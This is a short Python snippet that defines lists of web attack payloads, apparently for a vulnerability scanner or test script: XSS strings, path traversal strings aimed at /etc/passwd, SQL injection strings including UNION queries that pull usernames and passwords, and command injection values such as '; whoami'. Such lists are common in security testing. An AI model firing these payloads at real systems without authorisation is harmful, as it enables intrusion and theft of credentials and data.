
# Add XSS and Path Traversal payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>"
]

path_traversal_payloads = [
    "../etc/passwd",
    "../../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "/../../../../../../../../etc/passwd"
]

sql_injection_payloads = [
    "'OR1'=1'@gmail.com",
    #"admin@example.com' --",
    #"admin@example.com' OR '1'='1' --",
    "' OR '1'='1",
    "' UNION SELECT NULL, username, password FROM users --",
    "admin' --",
    "' AND 1=0 UNION SELECT NULL, username, password FROM users --",
    '" OR 1=1 --',
    "' AND 1=IF(1=1, SLEEP(5), 0) --",
    "admin' --",
    "' OR 1=1#"
    
]

command_injection_payloads = [
    "; ls",
    "; whoami",
    "; uname -a",
    "| id"
]